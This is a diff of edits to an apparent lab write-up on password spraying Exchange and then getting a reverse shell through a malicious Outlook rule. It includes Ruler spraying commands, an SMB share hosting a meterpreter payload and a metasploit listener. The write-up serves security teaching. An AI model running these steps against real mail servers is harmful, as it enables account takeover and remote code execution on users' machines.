@@ -6,7 +6,9 @@ This lab looks at an attacking technique called password spraying as well as abu
 
 ## Defininitions
 
-**Password spraying** is an attacking technique and a form of password brute-forcing. In password spraying, an attacker cycles through a list of possible usernames \(found using OSINT techniques against a target company or other means\) with a couple of most common passwords. In comparison, a traditional bruteforce works by selecting a username from the list and trying all the passwords in the wordlist against that username. Once all passwords are exhausted, another username is chosen from the list and the process repeats.
+**Password spraying** is a form of password brute-forcing attack. In password spraying, an attacker \(with the help of a tool\) cycles through a list of possible usernames \(found using OSINT techniques against a target company or other means\) with a couple of most commonly used weak passwords. 
+
+In comparison, a traditional brute-force works by selecting a username from the list and trying all the passwords in the wordlist against that username. Once all passwords are exhausted for that user name, another username is chosen from the list and the process repeats.
 
 Password spraying could be illustrated with the following table:
 
@@ -19,7 +21,7 @@ Password spraying could be illustrated with the following table:
 | ben | December2018! |
 | ... | December2018! |
 
-Standard password bruteforcing could be illustrated with the following table:
+Standard password brute-forcing could be illustrated with the following table:
 
 | User | Password |
 | :--- | :--- |
@@ -31,6 +33,8 @@ Standard password bruteforcing could be illustrated with the following table:
 | ben | Password1 |
 
 ## Password Spraying
+
+Let's try doing a password spray against an Exchange 2016 server in a `offense.local` domain:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -46,27 +50,27 @@ ruler -k --domain offense.local brute --users users --passwords passwords --verb
 
 The above shows that password spray was successful against the user `spotless` who used a weak password `123456`.
 
-Note, that if you are attempting to replicate this technique in your own labs, you may need to update your /etc/hosts to point to your Exchange server:
+Note, that if you are attempting to replicate this technique in your own labs, you may need to update your `/etc/hosts` to point to your Exchange server:
 
 ![](../.gitbook/assets/screenshot-from-2018-12-23-15-08-18.png)
 
 ## Getting a Shell via Malicious Email Rule
 
-### Overview
+### Process Overview
 
-If password spray against an Exchange server was successful and you have obtained valid credentials, you can leverage `Ruler` to create a malicious email rule to gain remote code execution on the host that checks that compromised mailbox.
+If the password spray against an Exchange server was successful and you have obtained valid credentials, you can now leverage `Ruler` to create a malicious email rule to that will gain you remote code execution on the host that checks that compromised mailbox.
 
 A high level overwiew of how the spraying and remote code execution works:
 
-* you have obtained working credentials during the spray for the user `spotless@offense.local`
-* witht the help of `Ruler`, a malicious mail rule is created for the compromised account which in our case is `spotless@offense.local`. The rule created will conform to the format along the lines of: `if emailSubject contains` **`someTriggerWord`**_`start`_**`pathToSomeProgram`**
+* assume you have obtained working credentials during the spray for the user `spotless@offense.local`
+* with the help of `Ruler`, a malicious mail rule is created for the compromised account which in our case is `spotless@offense.local`. The rule created will conform to the format along the lines of: `if emailSubject contains` **`someTriggerWord`**_`start`_**`pathToSomeProgram`**
 * A new email with subject containing `someTriggerWord` is sent to the `spotless@offense.local`
-* User spotless logs on to his/her workstation and launches Outlook to check for new email
-* Malicious email comes in and the malicious mail rule is triggered, which in turn launches starts the program specified in `pathToSomeProgram`
+* User `spotless` logs on to his/her workstation and launches Outlook client to check for new email
+* Malicious email comes in and the malicious mail rule is triggered, which in turn starts the program specified in `pathToSomeProgram` which is pointing to a malicious payload giving a reverse shell to the attacker
 
 ### Execution
 
-Let's validate the credentials are working by checking if there are any email rules created already:
+Let's validate the compromised credentials are working by checking if there are any email rules created already:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -76,13 +80,13 @@ ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-The below suggests the credentials are working and that no mail rules are set for this account:
+The below suggests the credentials are working and that no mail rules are set for this account yet:
 
 ![](../.gitbook/assets/screenshot-from-2018-12-23-17-15-36.png)
 
-To carry the attack further, I've generated a reverse meterpreter payload and saved it as a windows executable and saved it to `/root/tools/evilm64.exe`
+To carry out the attack further, I've generated a reverse meterpreter payload and saved it as a windows executable in `/root/tools/evilm64.exe` 
 
-We need to create an SMB share of the location where our evilm64.exe is located - this is the program we want executed on the host that checks the mailbox for which we have compromised the credentials during the password spray:
+We now need to create an SMB share that is accessible to our victim host and point it to the location where our payload evilm64.exe is located:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -92,7 +96,7 @@ smbserver.py tools /root/tools/
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Next, we setup a metasploit listener to catch the reverse shell:
+Next, we setup a metasploit listener to catch the incoming reverse shell:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -105,7 +109,7 @@ exploit
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Finally, we fire up the ruler and create the malicious email rule, to get remote code execution:
+Finally, we fire up the ruler and create the malicious email rule:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@kali" %}
@@ -140,6 +144,4 @@ ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 
 ## References
 
 {% embed url="https://github.com/sensepost/ruler/wiki" %}
-
-
 
